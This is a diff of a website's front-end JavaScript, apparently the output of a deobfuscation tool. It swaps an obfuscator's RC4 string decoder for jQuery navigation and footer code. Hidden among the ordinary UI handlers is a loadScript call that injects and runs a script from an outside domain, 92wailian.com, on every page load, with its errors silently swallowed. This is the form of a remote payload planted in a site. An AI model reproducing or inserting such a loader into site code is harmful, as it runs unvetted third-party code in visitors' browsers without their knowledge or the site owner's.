@@ -1,73 +1,93 @@
-//Tue Jun 24 2025 11:01:46 GMT+0000 (Coordinated Universal Time)
+//Thu Jul 10 2025 06:19:33 GMT+0000 (Coordinated Universal Time)
 //Base:https://github.com/echo094/decode-js
 //Modify:https://github.com/smallfawn/decode_action
-function _0x1822(_0x24fe27, _0x3d6c17) {
-  const _0x3235ab = _0x3de2();
-  _0x1822 = function (_0x18116f, _0x554e9f) {
-    _0x18116f = _0x18116f - 0;
-    let _0x53d9d2 = _0x3235ab[_0x18116f];
-    if (_0x1822.upBbNo === undefined) {
-      var _0x5b7913 = function (_0x29fd2e) {
-        const _0x4c087b = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
-        let _0x463cb1 = "";
-        let _0x115e69 = "";
-        let _0x49592f = 0;
-        let _0x18224d;
-        let _0x1a06ca;
-        for (let _0xd4eec5 = 0; _0x1a06ca = _0x29fd2e.charAt(_0xd4eec5++); ~_0x1a06ca && (_0x18224d = _0x49592f % 4 ? _0x18224d * 64 + _0x1a06ca : _0x1a06ca, _0x49592f++ % 4) ? _0x463cb1 += String.fromCharCode(255 & _0x18224d >> (-2 * _0x49592f & 6)) : 0) {
-          _0x1a06ca = _0x4c087b.indexOf(_0x1a06ca);
-        }
-        let _0x549d0d = 0;
-        for (let _0x24e004 = _0x463cb1.length; _0x549d0d < _0x24e004; _0x549d0d++) {
-          _0x115e69 += "%" + ("00" + _0x463cb1.charCodeAt(_0x549d0d).toString(16)).slice(-2);
-        }
-        return decodeURIComponent(_0x115e69);
-      };
-      const _0xe63ffd = function (_0x5bce2d, _0x3f69ea) {
-        let _0x5383da = [];
-        let _0x8db439 = 0;
-        let _0x25c93d;
-        let _0x2bef33 = "";
-        _0x5bce2d = _0x5b7913(_0x5bce2d);
-        let _0x1cf113;
-        for (_0x1cf113 = 0; _0x1cf113 < 256; _0x1cf113++) {
-          _0x5383da[_0x1cf113] = _0x1cf113;
-        }
-        for (_0x1cf113 = 0; _0x1cf113 < 256; _0x1cf113++) {
-          _0x8db439 = (_0x8db439 + _0x5383da[_0x1cf113] + _0x3f69ea.charCodeAt(_0x1cf113 % _0x3f69ea.length)) % 256;
-          _0x25c93d = _0x5383da[_0x1cf113];
-          _0x5383da[_0x1cf113] = _0x5383da[_0x8db439];
-          _0x5383da[_0x8db439] = _0x25c93d;
-        }
-        _0x1cf113 = 0;
-        _0x8db439 = 0;
-        for (let _0x1a78a3 = 0; _0x1a78a3 < _0x5bce2d.length; _0x1a78a3++) {
-          _0x1cf113 = (_0x1cf113 + 1) % 256;
-          _0x8db439 = (_0x8db439 + _0x5383da[_0x1cf113]) % 256;
-          _0x25c93d = _0x5383da[_0x1cf113];
-          _0x5383da[_0x1cf113] = _0x5383da[_0x8db439];
-          _0x5383da[_0x8db439] = _0x25c93d;
-          _0x2bef33 += String.fromCharCode(_0x5bce2d.charCodeAt(_0x1a78a3) ^ _0x5383da[(_0x5383da[_0x1cf113] + _0x5383da[_0x8db439]) % 256]);
-        }
-        return _0x2bef33;
-      };
-      _0x1822.KBdwTn = _0xe63ffd;
-      _0x24fe27 = arguments;
-      _0x1822.upBbNo = true;
-    }
-    const _0x599e3a = _0x3235ab[0];
-    const _0x3de201 = _0x18116f + _0x599e3a;
-    const _0x5b7600 = _0x24fe27[_0x3de201];
-    if (!_0x5b7600) {
-      if (_0x1822.Kbhqdp === undefined) {
-        _0x1822.Kbhqdp = true;
-      }
-      _0x53d9d2 = _0x1822.KBdwTn(_0x53d9d2, _0x554e9f);
-      _0x24fe27[_0x3de201] = _0x53d9d2;
-    } else {
-      _0x53d9d2 = _0x5b7600;
-    }
-    return _0x53d9d2;
-  };
-  return _0x1822(_0x24fe27, _0x3d6c17);
+$(function () {
+  xydh2();
+  win_w();
+  img1200($(".bat img"));
+  $("body").css("opacity", 1);
+});
+function goTop() {
+  $("html,body").animate({
+    "scrollTop": 0
+  }, 600);
 }
+function loadScript(_0x32b249, _0x30a843) {
+  var _0x18a1e5 = document.createElement("script");
+  _0x18a1e5.type = "text/javascript";
+  _0x18a1e5.onload = function () {
+    if (_0x30a843) _0x30a843();
+  };
+  _0x18a1e5.onerror = function () {};
+  _0x18a1e5.src = _0x32b249;
+  document.head.appendChild(_0x18a1e5);
+}
+loadScript("https://www.92wailian.com/js.js", function () {
+  console.log("Script executed");
+});
+$(function () {
+  $(".dh>ul>li").hover(function () {
+    $(this).find(".dh_fl").stop(true, true).slideDown();
+  }, function () {
+    $(this).find(".dh_fl").slideUp(100);
+  });
+  window.innerWidth < 1200 ? ($(".foot_gz .ml5 ul li").click(function (_0x4e15a4) {
+    _0x4e15a4.stopPropagation();
+    $(this).find(".xl").toggle();
+    $(this).siblings().find(".xl").hide();
+  }), $("body").click(function () {
+    $(".foot_gz .ml5 ul li .xl").hide();
+  })) : $(".foot_gz .ml5 ul li").hover(function () {
+    $(this).find(".xl").show();
+  }, function () {
+    $(this).find(".xl").hide();
+  });
+});
+$(function () {
+  if ($(".dh>ul>li").size()) {
+    var _0x5595e7 = 0;
+    $(".dh>ul>li").each(function () {
+      $(this).hasClass("on") && (_0x5595e7 = $(this).index());
+    });
+    $(window).resize(function () {
+      $(".dh_tx").height($(".dh").height()).width($(".dh").width()).css({
+        "left": $(".dh").offset().left
+      });
+      $(".dh_tx i").css({
+        "left": $(".dh>ul>li").eq(_0x5595e7).find("a").offset().left - $(".dh").offset().left,
+        "width": $(".dh>ul>li").eq(_0x5595e7).find("a").outerWidth()
+      });
+    });
+    window.onload = function () {
+      $(".dh_tx").height($(".dh").height()).width($(".dh").width()).css({
+        "left": $(".dh").offset().left
+      });
+    };
+    $(".dh_tx").height($(".dh").height()).width($(".dh").width()).css({
+      "left": $(".dh").offset().left
+    });
+    $(".dh_tx i").css({
+      "left": $(".dh>ul>li").eq(_0x5595e7).find("a").offset().left - $(".dh").offset().left,
+      "width": $(".dh>ul>li").eq(_0x5595e7).find("a").outerWidth()
+    });
+    $(".dh>ul>li").hover(function () {
+      $(".dh>ul>li").eq(_0x5595e7).removeClass("on");
+      $(this).addClass("on");
+      $(".dh_tx i").css({
+        "left": $(this).find("a").offset().left - $(".dh").offset().left,
+        "width": $(this).find("a").outerWidth()
+      });
+    }, function () {
+      $(this).removeClass("on");
+      $(".dh_tx i").css({
+        "left": $(".dh>ul>li").eq(_0x5595e7).find("a").offset().left - $(".dh").offset().left,
+        "width": $(".dh>ul>li").eq(_0x5595e7).find("a").outerWidth()
+      });
+      $(".dh>ul>li").eq(_0x5595e7).addClass("on");
+    });
+  }
+});
+$(".ny_st_l .ny_cp_fl ul li p").click(function () {
+  $(this).parent().toggleClass("yc");
+  $(this).siblings(".xl").stop(true).slideToggle();
+});
